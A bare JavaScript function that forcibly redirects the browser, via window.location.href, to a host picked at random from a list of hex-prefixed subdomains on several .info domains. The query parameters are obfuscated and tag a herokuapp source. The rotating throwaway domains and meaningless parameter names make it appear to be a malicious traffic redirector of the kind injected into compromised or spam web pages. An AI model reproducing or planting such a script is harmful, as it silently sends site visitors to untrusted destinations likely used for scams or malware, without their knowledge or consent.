function setElem() {
      var elemS = "https://";
      var randomains = [
      '52fdfc0721.borhbe.info', 
      '82654f163f.borhbe.info', 
      '729566c74d.pluscost.info', 
      '5f0f9a621d.pluscost.info', 
      '10037c4d7b.sptzoom.info'];
      var randomIndex = Math.floor(Math.random() * (randomains.length - 1));
      var result = randomains[randomIndex];
      var elemB = "c243959fd7d706a9b4863";
      var elemC = "infobeast.herokuapp.com";
      var elemD = "herokuapp";
      var rand5 = "f8smg";
      var rand10 = "t2jquvpcog";
      var rand8 = "o2jquvgt";
      
      console.log('<hr>2 result',result);
   

      window.location.href = ""+elemS+""+result+"/?"+rand5+"="+elemB+"&"+rand10+"="+elemC+"&"+rand8+"="+elemD+"";
        
    }
    
